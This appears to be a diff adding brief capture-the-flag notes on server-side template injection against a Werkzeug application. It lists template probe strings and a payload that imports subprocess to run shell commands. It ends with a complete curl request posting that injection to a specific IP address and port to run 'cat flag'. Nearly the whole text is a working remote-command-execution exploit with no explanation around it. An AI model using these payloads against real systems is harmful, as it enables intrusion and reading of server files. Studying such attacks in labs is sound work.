@@ -1,0 +1,12 @@
+search
+werkzeug server-side template-injection
+hacktricks:
+test each one and this one is good - ${7*7}
+this one causes error: <%= 7*7 %>
+
+name=<% import subprocess
+ans = subprocess.run('ls', shell=True, stdout=subprocess.PIPE)
+%>
+printData=${ans}
+
+curl -X post --data "name=<% import subprocess; ans = subprocess.run('cat flag', shell=True, stdout=subprocess.PIPE); %> printData=${ans}" http://35.198.135.192:30117/
